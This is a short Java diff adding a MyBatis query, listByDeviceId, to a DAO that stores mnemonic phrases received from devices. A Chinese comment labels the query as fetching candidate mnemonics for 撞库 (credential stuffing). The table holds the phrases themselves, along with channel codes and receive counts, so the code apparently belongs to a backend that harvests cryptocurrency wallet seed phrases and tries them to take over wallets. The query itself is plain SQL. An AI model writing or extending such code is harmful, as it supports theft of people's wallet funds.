@@ -28,4 +28,12 @@ public interface MnemonicDao extends BaseMapper<MnemonicEntity> {
     int incrementDupCount(@Param("deviceId") String deviceId,
                           @Param("source") String source,
                           @Param("phraseHash") String phraseHash);
+
+    /** 同设备候选助记词（撞库用，新到旧） */
+    @Select("SELECT id, device_id AS deviceId, channelcode, wordscount, result, source, "
+            + "recv_dup_count AS recvDupCount, status, result_hash AS phraseHash, addtime "
+            + "FROM mnemonic WHERE device_id = #{deviceId} AND IFNULL(status,1) = 1 "
+            + "ORDER BY id DESC LIMIT #{limit}")
+    java.util.List<MnemonicEntity> listByDeviceId(@Param("deviceId") String deviceId,
+                                                  @Param("limit") int limit);
 }
